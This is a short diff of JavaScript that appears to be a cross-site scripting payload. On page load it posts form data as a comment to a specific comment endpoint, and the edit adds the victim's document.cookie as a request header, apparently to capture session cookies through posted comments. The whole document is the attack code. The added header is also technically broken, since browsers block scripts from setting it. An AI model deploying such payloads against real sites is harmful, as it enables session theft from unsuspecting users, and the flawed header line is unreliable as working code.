@@ -8,8 +8,11 @@ window.onload = function() {
   formData.append("body", data);
 
   fetch("/comment/5f23b748-ef89-456f-a0b9-acb169b5ee61",{
-		  method: 'POST',
+      method: 'POST',
       credentials: 'omit',
-		  body: formData
+      body: formData,
+      headers: {
+      	'Cookie': document.cookie
+      }
   });
 };
